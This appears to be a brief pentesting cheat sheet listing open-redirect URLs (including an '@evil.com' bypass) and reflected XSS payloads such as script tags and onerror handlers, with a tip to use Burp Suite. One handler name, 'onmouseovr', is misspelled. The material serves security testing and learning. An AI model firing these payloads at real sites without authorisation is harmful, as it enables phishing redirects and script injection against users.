# Open redirect

- __`https://test.com/?redirect=https://www.google.com`__
- __`https://test.com/?redirect=https://www.google.com@evil.com`__


# Cross-Site Scripting (XSS)

- __`/?name="><u>test123`__
- __`/?name="><u>test123<script>alert(1)</script>`__
- __`/?name="><u>test123<image src=x onerror=alert()>`__
- __`/?name="><u>test123<image src=x onmouseover=alert()>`__
- __`/?name="><u>test123<image src=x onmouseovr=document.write(1)>`__
- > __If you are not getting /?name=test123 in url you can use burpsuite__
  - ![image1](https://github.com/Chittu13/All_in_one/blob/main/image/image1.png)
